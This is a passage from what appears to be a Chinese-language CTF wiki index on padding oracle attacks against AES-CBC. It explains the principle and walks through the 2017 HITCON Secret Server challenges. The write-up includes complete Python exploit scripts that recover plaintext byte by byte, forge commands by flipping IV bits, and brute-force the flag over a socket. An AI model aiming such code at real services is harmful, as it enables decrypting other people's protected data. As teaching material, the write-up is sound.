plain' ) plain0 = '' for last_byte in last_bytes : plain0 = '' for i in range ( 15 ): print 'idx:' , i tag = False for j in range ( 256 ): send_data ( plain0 + chr ( j )) pad_size = 15 - i iv = iv_pre + chr ( pad_size ^ last_byte ) tmpblock = block [: 15 ] + chr ( pad_size ^ last_byte ^ ord ( block [ - 1 ]) ^ iv_last ) payload = iv + tmpblock + iv send_data ( payload ) length , data = recv_data () if 'Looks' not in data : # success plain0 += chr ( j ) tag = True break if not tag : break # means the last byte is ok if plain0 != '' : break plain0 += chr ( iv_last ^ last_byte ) return plain0 \u89e3\u5bc6\u51fa\u6307\u5b9a\u660e\u6587 \u00b6 \u8fd9\u4e00\u70b9\u6bd4\u8f83\u7b80\u5355\uff0c\u6211\u4eec\u5e0c\u671b\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u83b7\u53d6 gimme_flag \u7684\u5bc6\u6587 print ( 'get the cipher of flag' ) gemmi_iv1 = xor ( pad ( 'gimme_flag' ), plain0 ) gemmi_c1 = xor ( gemmi_iv1 , cipher0 ) payload = gemmi_iv1 + gemmi_c1 + gemmi_iv1 send_data ( 'gimme_flag' ) send_data ( payload ) flag_len , flag_cipher = recv_data () \u5176\u4e2d plain0 \u548c cipher0 \u662f\u6211\u4eec\u83b7\u53d6\u7684 AES \u52a0\u5bc6\u7684\u660e\u5bc6\u6587\u5bf9\uff0c\u4e0d\u5305\u62ec\u4e4b\u524d\u548c\u4e4b\u540e\u7684\u4e24\u4e2a\u5f02\u6216\u3002 \u89e3\u5bc6 flag \u00b6 \u8fd9\u4e00\u70b9\uff0c\u5176\u5b9e\u5c31\u662f\u5229\u7528\u89e3\u5bc6\u4efb\u610f\u52a0\u5bc6\u5757\u7684\u529f\u80fd\u5b9e\u73b0\u7684\uff0c\u5982\u4e0b print ( 'the flag cipher is ' + flag_cipher . encode ( 'hex' )) flag_cipher = split_by ( flag_cipher , 16 ) print ( 'decrypt the blocks one by one' ) plain = '' for i in range ( len ( flag_cipher ) - 1 ): print ( 'block: ' + str ( i )) if i == 0 : plain += dec_block ( flag_cipher [ i ], flag_cipher [ i + 1 ]) else : iv = plain [ - 16 :] cipher = xor ( xor ( iv , flag_cipher [ i + 1 ]), flag_cipher [ i ]) plain += dec_block ( iv , cipher ) pass print ( 'now plain: ' + plain ) print plain \u53ef\u4ee5\u601d\u8003\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u7b2c\u4e8c\u5757\u4e4b\u540e\u7684\u5bc6\u6587\u64cd\u4f5c\u4f1a\u6709\u6240\u4e0d\u540c\u3002 \u5b8c\u6574\u7684\u4ee3\u7801\u53c2\u8003 ctf-challenge \u4ed3\u5e93\u3002 \u53c2\u8003\u8d44\u6599 \u00b6 \u5206\u7ec4\u52a0\u5bc6\u6a21\u5f0f https://en.wikipedia.org/wiki/Padding_oracle_attack http://netifera.com/research/poet/PaddingOraclesEverywhereEkoparty2010.pdf https://ctftime.org/writeup/7975 https://ctftime.org/writeup/7974","title":"Padding Oracle Attack"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#padding-oracle-attack","text":"","title":"Padding Oracle Attack"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_1","text":"Padding Oracle Attack \u653b\u51fb\u4e00\u822c\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6 \u52a0\u5bc6\u7b97\u6cd5 \u91c7\u7528 PKCS5 Padding \u7684\u52a0\u5bc6\u7b97\u6cd5\u3002 \u5f53\u7136\uff0c\u975e\u5bf9\u79f0\u52a0\u5bc6\u4e2d OAEP \u7684\u586b\u5145\u65b9\u5f0f\u4e5f\u6709\u53ef\u80fd\u4f1a\u53d7\u5230\u5f71\u54cd\u3002 \u5206\u7ec4\u6a21\u5f0f\u4e3a CBC \u6a21\u5f0f\u3002 \u653b\u51fb\u8005\u80fd\u529b \u653b\u51fb\u8005\u53ef\u4ee5\u62e6\u622a\u4e0a\u8ff0\u52a0\u5bc6\u7b97\u6cd5\u52a0\u5bc6\u7684\u6d88\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u548c padding oracle\uff08\u5373\u670d\u52a1\u5668\uff09 \u8fdb\u884c\u4ea4\u4e92\uff1a\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u7aef\u53d1\u9001\u5bc6\u6587\uff0c\u670d\u52a1\u5668\u7aef\u4f1a\u4ee5\u67d0\u79cd\u8fd4\u56de\u4fe1\u606f\u544a\u77e5\u5ba2\u6237\u7aef padding \u662f\u5426\u6b63\u5e38\u3002 Padding Oracle Attack \u653b\u51fb\u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u5982\u4e0b \u5728\u4e0d\u6e05\u695a key \u548c IV \u7684\u524d\u63d0\u4e0b\u89e3\u5bc6\u4efb\u610f\u7ed9\u5b9a\u7684\u5bc6\u6587\u3002","title":"\u4ecb\u7ecd"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_2","text":"Padding Oracle Attack \u653b\u51fb\u7684\u57fa\u672c\u539f\u7406\u5982\u4e0b \u5bf9\u4e8e\u5f88\u957f\u7684\u6d88\u606f\u4e00\u5757\u4e00\u5757\u89e3\u5bc6\u3002 \u5bf9\u4e8e\u6bcf\u4e00\u5757\u6d88\u606f\uff0c\u5148\u89e3\u5bc6\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u89e3\u5bc6\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002 \u8fd9\u91cc\u6211\u4eec\u56de\u987e\u4e00\u4e0b CBC \u7684 \u52a0\u5bc6 C_i=E_K(P_i \\oplus C_{i-1})\\\\ C_0=IV C_i=E_K(P_i \\oplus C_{i-1})\\\\ C_0=IV \u89e3\u5bc6 P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV \u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e8e\u89e3\u5bc6\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u4e0d\u77e5\u9053 IV \u548c key\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u5bc6\u6587\u5757\u7684\u957f\u5ea6\u4e3a n \u4e2a\u5b57\u8282\u3002 \u5047\u8bbe\u6211\u4eec\u622a\u83b7\u4e86\u5bc6\u6587 Y\uff0c\u4ee5\u83b7\u53d6\u5bc6\u6587 Y \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a\u4f8b\u5b50\u8fdb\u884c\u5206\u6790\u3002\u4e3a\u4e86\u83b7\u53d6 Y \u7684\u5185\u5bb9\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u4f2a\u9020\u4e00\u5757\u5bc6\u6587 F \u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u662f\u56e0\u4e3a\u82e5\u6211\u4eec\u6784\u9020\u5bc6\u6587 F|Y \uff0c\u90a3\u4e48\u89e3\u5bc6 Y \u65f6\u5177\u4f53\u4e3a P=D_K(Y)\\oplus F P=D_K(Y)\\oplus F \uff0c\u6240\u4ee5\u4fee\u6539\u5bc6\u6587 F \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282 F_{n} F_{n} \u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u7684\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u4e0b\u9762\u7ed9\u51fa\u83b7\u53d6 P \u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u8fc7\u7a0b i=0\uff0c\u8bbe\u7f6e F \u7684\u6bcf\u4e2a\u5b57\u8282\u4e3a \u968f\u673a\u5b57\u8282 \u3002 \u8bbe\u7f6e F_n=i \\oplus 0x01 F_n=i \\oplus 0x01 \u5c06 F|Y \u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u5982\u679c P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u662f i \u7684\u8bdd\uff0c\u90a3\u4e48\u6700\u540e\u7684 padding \u5c31\u662f 0x01\uff0c\u4e0d\u4f1a\u51fa\u73b0\u9519\u8bef\u3002\u5426\u5219\uff0c\u53ea\u6709 P \u7684\u6700\u540e P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01 \u5b57\u8282\u90fd\u662f P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01 \u624d\u4e0d\u4f1a\u62a5\u9519\u3002 \u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f padding \u7684\u5b57\u8282\u53ea\u80fd\u662f 0 \u5230 n\u3002 \u56e0\u6b64\uff0c\u82e5\u60f3\u8981\u4f7f\u5f97\u5728 F \u968f\u673a\u5730\u60c5\u51b5\u4e0b\uff0c\u5e76\u4e14\u6ee1\u8db3padding \u5b57\u8282\u5927\u5c0f\u7684\u7ea6\u675f\u60c5\u51b5\u4e0b\u8fd8\u4e0d\u62a5\u9519 \u6982\u7387\u5f88\u5c0f \u3002\u6240\u4ee5\u5728\u670d\u52a1\u5668\u7aef\u4e0d\u62a5\u9519\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u6211\u4eec\u786e\u5b9e\u83b7\u53d6\u4e86\u6b63\u786e\u7684\u5b57\u8282\u3002 \u5728\u51fa\u73b0\u9519\u8bef\u7684\u60c5\u51b5\u4e0b\uff0ci=i+1\uff0c\u8df3\u8f6c\u52302\u3002 \u5f53\u83b7\u53d6\u4e86 P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u83b7\u53d6 P \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u6b64\u65f6\u9700\u8981\u8bbe\u7f6e F_n=P_n\\oplus 0x02 F_n=P_n\\oplus 0x02 \uff0c\u540c\u65f6\u8bbe\u7f6e F_{n-1}=i \\oplus 0x02 F_{n-1}=i \\oplus 0x02 \u53bb\u679a\u4e3e i\u3002 \u6240\u4ee5\uff0c\u7efc\u4e0a\u6240\u793a\uff0cPadding Oracle Attack \u5176\u5b9e\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u662f\u4e00\u79cd\u5177\u6709\u5f88\u5927\u6982\u7387\u6210\u529f\u7684\u653b\u51fb\u65b9\u6cd5\u3002 \u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f80\u5f80\u9047\u5230\u7684\u4e00\u4e9b\u73b0\u5b9e\u95ee\u9898\u5e76\u4e0d\u662f\u6807\u51c6\u7684 Padding Oracle Attack \u6a21\u5f0f\uff0c\u6211\u4eec\u5f80\u5f80\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u53d8\u5f62\u3002","title":"\u539f\u7406"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#2017-hitcon-secret-server","text":"","title":"2017 HITCON Secret Server"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_3","text":"\u7a0b\u5e8f\u4e2d\u91c7\u7528\u7684\u52a0\u5bc6\u662f AES CBC\uff0c\u5176\u4e2d\u91c7\u7528\u7684 padding \u4e0e PKCS5 \u7c7b\u4f3c def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] \u4f46\u662f\uff0c\u5728\u6bcf\u6b21 unpad \u65f6\u5e76\u6ca1\u6709\u8fdb\u884c\u68c0\u6d4b\uff0c\u800c\u662f\u76f4\u63a5\u8fdb\u884c unpad\u3002 \u5176\u4e2d\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6bcf\u6b21\u548c\u7528\u6237\u4ea4\u4e92\u7684\u51fd\u6570\u662f send_msg \uff0c\u63a5\u53d7\u7528\u6237\u7684\u660e\u6587\uff0c\u4f7f\u7528\u56fa\u5b9a\u7684 2jpmLoSsOlQrqyqE \u4f5c\u4e3a IV\uff0c\u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u7ed3\u679c\u8f93\u51fa\u3002 recv_msg \uff0c\u63a5\u53d7\u7528\u6237\u7684 IV \u548c\u5bc6\u6587\uff0c\u5bf9\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u8fd4\u56de\u3002\u6839\u636e\u8fd4\u56de\u7684\u7ed3\u679c\u4f1a\u6709\u4e0d\u540c\u7684\u64cd\u4f5c msg = recv_msg () . strip () if msg . startswith ( 'exit-here' ): exit ( 0 ) elif msg . startswith ( 'get-flag' ): send_msg ( flag ) elif msg . startswith ( 'get-md5' ): send_msg ( MD5 . new ( msg [ 7 :]) . digest ()) elif msg . startswith ( 'get-time' ): send_msg ( str ( time . time ())) elif msg . startswith ( 'get-sha1' ): send_msg ( SHA . new ( msg [ 8 :]) . digest ()) elif msg . startswith ( 'get-sha256' ): send_msg ( SHA256 . new ( msg [ 10 :]) . digest ()) elif msg . startswith ( 'get-hmac' ): send_msg ( HMAC . new ( msg [ 8 :]) . digest ()) else : send_msg ( 'command not found' )","title":"\u5206\u6790"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_4","text":"\u8fd9\u91cc\u6211\u4eec\u518d\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u6211\u4eec\u5df2\u6709\u7684\u90e8\u5206 \u52a0\u5bc6 \u52a0\u5bc6\u65f6\u7684 IV \u662f\u56fa\u5b9a\u7684\u800c\u4e14\u5df2\u77e5\u3002 'Welcome!!' \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002 \u89e3\u5bc6 \u6211\u4eec\u53ef\u4ee5\u63a7\u5236 IV\u3002 \u9996\u5148\uff0c\u65e2\u7136\u6211\u4eec\u77e5\u9053 Welcome!! \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u8fd8\u53ef\u4ee5\u63a7\u5236 recv_msg \u4e2d\u7684 IV\uff0c\u90a3\u4e48\u6839\u636e\u89e3\u5bc6\u8fc7\u7a0b P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV \u5982\u679c\u6211\u4eec\u5c06 Welcome!! \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u8f93\u5165\u7ed9 recv_msg\uff0c\u90a3\u4e48\u76f4\u63a5\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u4fbf\u662f \uff08Welcome!!+'\\x07'*7) xor iv \uff0c\u5982\u679c\u6211\u4eec \u6070\u5f53\u7684\u63a7\u5236\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\u4f20\u9012\u7684 iv \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u6267\u884c \u4e0a\u8ff0\u6240\u8bf4\u7684\u4efb\u610f\u547d\u4ee4 \u3002\u4ece\u800c\uff0c\u6211\u4eec\u4e5f\u5c31\u53ef\u4ee5\u77e5\u9053 flag \u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002 \u5176\u6b21\uff0c\u5728\u4e0a\u9762\u7684\u57fa\u7840\u4e4b\u4e0a\uff0c\u5982\u679c\u6211\u4eec\u5728\u4efb\u4f55\u5bc6\u6587 C \u540e\u9762\u6dfb\u52a0\u81ea\u5b9a\u4e49\u7684 IV \u548c Welcome \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 recv_msg\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u4e4b\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c \u90a3\u4e48\u7531\u4e8e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u957f\u5ea6\u51cf\u5c0f 0 \u5230 255 \u3002","title":"\u4e3b\u8981\u6f0f\u6d1e"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_5","text":"\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u7ed5\u8fc7 proof of work \u6839\u636e\u6267\u884c\u4efb\u610f\u547d\u4ee4\u7684\u65b9\u5f0f\u83b7\u53d6\u52a0\u5bc6\u540e\u7684 flag\u3002 \u7531\u4e8e flag \u7684\u5f00\u5934\u662f hitcon{ \uff0c\u4e00\u5171\u67097\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u4efb\u7136\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 iv \u6765\u4f7f\u5f97\u89e3\u5bc6\u540e\u7684\u524d 7 \u4e2a\u5b57\u8282\u4e3a\u6307\u5b9a\u5b57\u8282\u3002\u8fd9\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e8e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6267\u884c get-md5 \u547d\u4ee4\u3002\u800c\u6839\u636e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6070\u597d\u5728\u6d88\u606f\u7684\u7b2c\u51e0\u4e2a\u5b57\u8282\u5904\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f00\u59cb\u65f6\u5c06\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u4e3a hitcon{x \uff0c\u5373\u53ea\u4fdd\u7559 hitcon{ \u540e\u7684\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u6837\u4fbf\u53ef\u4ee5\u83b7\u5f97\u5e26\u4e00\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002\u7c7b\u4f3c\u5730\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u83b7\u5f97\u5e26\u5236\u5b9a\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002 \u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u9010\u5b57\u8282\u7206\u7834\uff0c\u8ba1\u7b97\u5bf9\u5e94 md5 \uff0c\u7136\u540e\u518d\u6b21\u5229\u7528\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\u65b9\u5f0f\uff0c\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u660e\u6587\u4e3a\u4efb\u610f\u6307\u5b9a\u547d\u4ee4\uff0c\u5982\u679c\u63a7\u5236\u4e0d\u6210\u529f\uff0c\u90a3\u8bf4\u660e\u8be5\u5b57\u8282\u4e0d\u5bf9\uff0c\u9700\u8981\u518d\u6b21\u7206\u7834\uff1b\u5982\u679c\u6b63\u786e\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u5bf9\u5e94\u7684\u547d\u4ee4\u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b #coding=utf-8 from pwn import * import base64 , time , random , string from Crypto.Cipher import AES from Crypto.Hash import SHA256 , MD5 #context.log_level = 'debug' if args [ 'REMOTE' ]: p = remote ( '52.193.157.19' , 9999 ) else : p = remote ( '127.0.0.1' , 7777 ) def strxor ( str1 , str2 ): return '' . join ([ chr ( ord ( c1 ) ^ ord ( c2 )) for c1 , c2 in zip ( str1 , str2 )]) def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] # \u53bb\u6389pad def flipplain ( oldplain , newplain , iv ): \"\"\"flip oldplain to new plain, return proper iv\"\"\" return strxor ( strxor ( oldplain , newplain ), iv ) def bypassproof (): p . recvuntil ( 'SHA256(XXXX+' ) lastdata = p . recvuntil ( ')' , drop = True ) p . recvuntil ( ' == ' ) digest = p . recvuntil ( ' \\n Give me XXXX:' , drop = True ) def proof ( s ): return SHA256 . new ( s + lastdata ) . hexdigest () == digest data = pwnlib . util . iters . mbruteforce ( proof , string . ascii_letters + string . digits , 4 , method = 'fixed' ) p . sendline ( data ) p . recvuntil ( 'Done! \\n ' ) iv_encrypt = '2jpmLoSsOlQrqyqE' def getmd5enc ( i , cipher_flag , cipher_welcome ): \"\"\"return encrypt( md5( flag[7:7+i] ) )\"\"\" ## keep iv[7:] do not change, so decrypt won't change new_iv = flipplain ( \"hitcon{\" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv_encrypt ) payload = new_iv + cipher_flag ## calculate the proper last byte number last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), \"a\" * 15 + chr ( len ( cipher_flag ) + 16 + 16 - ( 7 + i + 1 )), iv_encrypt ) payload += last_byte_iv + cipher_welcome p . sendline ( base64 . b64encode ( payload )) return p . recvuntil ( \" \\n \" , drop = True ) def main (): bypassproof () # result of encrypted Welcome!! cipher = p . recvuntil ( ' \\n ' , drop = True ) cipher_welcome = base64 . b64decode ( cipher )[ 16 :] log . info ( \"cipher welcome is : \" + cipher_welcome ) # execute get-flag get_flag_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"get-flag\" ), iv_encrypt ) payload = base64 . b64encode ( get_flag_iv + cipher_welcome ) p . sendline ( payload ) cipher = p . recvuntil ( ' \\n ' , drop = True ) cipher_flag = base64 . b64decode ( cipher )[ 16 :] flaglen = len ( cipher_flag ) log . info ( \"cipher flag is : \" + cipher_flag ) # get command not found cipher p . sendline ( base64 . b64encode ( iv_encrypt + cipher_welcome )) cipher_notfound = p . recvuntil ( ' \\n ' , drop = True ) flag = \"\" # brute force for every byte of flag for i in range ( flaglen - 7 ): md5_indexi = getmd5enc ( i , cipher_flag , cipher_welcome ) md5_indexi = base64 . b64decode ( md5_indexi )[ 16 :] log . info ( \"get encrypt(md5(flag[7:7+i])): \" + md5_indexi ) for guess in range ( 256 ): # locally compute md5 hash guess_md5 = MD5 . new ( flag + chr ( guess )) . digest () # try to null out the md5 plaintext and execute a command payload = flipplain ( guess_md5 , 'get-time' . ljust ( 16 , ' \\x01 ' ), iv_encrypt ) payload += md5_indexi p . sendline ( base64 . b64encode ( payload )) res = p . recvuntil ( \" \\n \" , drop = True ) # if we receive the block for 'command not found', the hash was wrong if res == cipher_notfound : print 'Guess {} is wrong.' . format ( guess ) # otherwise we correctly guessed the hash and the command was executed else : print 'Found!' flag += chr ( guess ) print 'Flag so far:' , flag break if __name__ == \"__main__\" : main () \u6700\u540e\u7ed3\u679c\u5982\u4e0b Flag so far: Paddin9_15_ve3y_h4rd__!! } \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10","title":"\u5229\u7528\u601d\u8def"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#2017-hitcon-secret-server-revenge","text":"","title":"2017 HITCON Secret Server Revenge"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_6","text":"The password of zip is the flag of \"Secret Server\"","title":"\u63cf\u8ff0"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_7","text":"\u8fd9\u4e2a\u7a0b\u5e8f\u65f6\u63a5\u7740\u4e0a\u9762\u7684\u7a0b\u5e8f\u7ee7\u7eed\u641e\u7684\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8fdb\u884c\u7684\u7b80\u5355\u7684\u4fee\u6539 \u52a0\u5bc6\u7b97\u6cd5\u7684 iv \u672a\u77e5\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u6839\u636e Welcome \u52a0\u5bc6\u540e\u7684\u6d88\u606f\u63a8\u7b97\u51fa\u6765\u3002 \u7a0b\u5e8f\u591a\u4e86\u4e00\u4e2a 56 \u5b57\u8282\u7684 token\u3002 \u7a0b\u5e8f\u6700\u591a\u80fd\u8fdb\u884c 340 \u64cd\u4f5c\uff0c\u56e0\u6b64\u4e0a\u8ff0\u7684\u7206\u7834\u81ea\u7136\u4e0d\u53ef\u884c \u7a0b\u5e8f\u7684\u5927\u6982\u6d41\u7a0b\u5982\u4e0b \u7ecf\u8fc7 proof of work \u53d1\u9001 \u201cWelcome!!\u201d \u52a0\u5bc6\u540e\u7684\u6d88\u606f \u5728 340 \u6b21\u64cd\u4f5c\u4e2d\uff0c\u9700\u8981\u731c\u4e2d token \u7684\u503c\uff0c\u7136\u540e\u4f1a\u81ea\u52a8\u5c06 flag \u8f93\u51fa\u3002","title":"\u5206\u6790"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_8","text":"\u5f53\u7136\uff0c\u5728\u4e0a\u4e2a\u9898\u76ee\u4e2d\u5b58\u5728\u7684\u6f0f\u6d1e\uff0c\u5728\u8fd9\u4e2a\u9898\u76ee\u4e2d\u4ecd\u7136\u5b58\u5728\uff0c\u5373 \u4efb\u610f\u6267\u884c\u7ed9\u5b9a\u547d\u4ee4 \u957f\u5ea6\u622a\u65ad","title":"\u6f0f\u6d1e"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_9","text":"\u7531\u4e8e 340 \u7684\u6b21\u6570\u9650\u5236\uff0c\u867d\u7136\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u83b7\u5f97 md5(token[:i]) \u52a0\u5bc6\u540e\u7684\u503c\uff08 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u90e8\u5206\u52a0\u5bc6\u540e\u6070\u597d\u662f 32 \u4e2a\u5b57\u8282\uff0c\u524d 16 \u4e2a\u5b57\u8282\u662f md5 \u540e\u52a0\u5bc6\u7684\u503c\uff0c\u540e\u9762\u7684 16 \u4e2a\u5b57\u8282\u5b8c\u5168\u662f\u586b\u5145\u7684\u52a0\u5bc6\u540e\u7684\u5b57\u8282\u3002 \u8fd9\u91cc md5(token[:i]) \u7279\u6307\u524d16\u4e2a\u5b57\u8282\u3002\uff09\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e0d\u80fd\u518d\u6b21\u4e3a\u4e86\u83b7\u5f97\u4e00\u4e2a\u5b57\u7b26\u53bb\u7206\u7834 256 \u6b21\u4e86\u3002 \u65e2\u7136\u4e0d\u80fd\u591f\u7206\u7834\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u4e00\u6b21\u83b7\u53d6\u4e00\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\u5462\uff1f\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u6765\u68b3\u7406\u4e00\u4e0b\u8be5\u7a0b\u5e8f\u53ef\u80fd\u53ef\u4ee5\u6cc4\u6f0f\u7684\u4fe1\u606f \u67d0\u4e9b\u6d88\u606f\u7684 md5 \u503c\u52a0\u5bc6\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6 md5(token[:i]) \u52a0\u5bc6\u540e\u7684\u503c\u3002 unpad \u6bcf\u6b21\u4f1a\u5bf9\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u8fdb\u884c unpad\uff0c\u8fd9\u4e2a\u5b57\u8282\u662f\u6839\u636e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6765\u51b3\u5b9a\u7684\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8fd9\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u77e5\u9053\u4e00\u4e2a\u5b57\u8282\u7684\u503c\u3002 \u8fd9\u91cc\u6211\u4eec\u6df1\u5165\u5206\u6790\u4e00\u4e0b unpad \u7684\u4fe1\u606f\u6cc4\u6f0f\u3002\u5982\u679c\u6211\u4eec\u5c06\u52a0\u5bc6 IV \u548c encrypt(md5(token[:i])) \u653e\u5728\u67d0\u4e2a\u5bc6\u6587 C \u7684\u540e\u9762\uff0c\u6784\u6210 C|IV|encrypt(md5(token[:i])) \uff0c\u90a3\u4e48\u89e3\u5bc6\u51fa\u6765\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u5c31\u662f md5(token[:i]) \u3002\u8fdb\u800c\uff0c\u5728 unpad \u7684\u65f6\u5019\u5c31\u662f\u5229\u7528 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff08 0-255\uff09\u8fdb\u884c unpad\uff0c\u4e4b\u540e\u5bf9 unpad \u540e\u7684\u5b57\u7b26\u4e32\u6267\u884c\u6307\u5b9a\u7684\u547d\u4ee4\uff08\u6bd4\u5982md5\uff09\u3002\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec \u4e8b\u5148\u6784\u9020\u4e00\u4e9b\u6d88\u606f\u54c8\u5e0c\u540e\u52a0\u5bc6\u7684\u6837\u672c 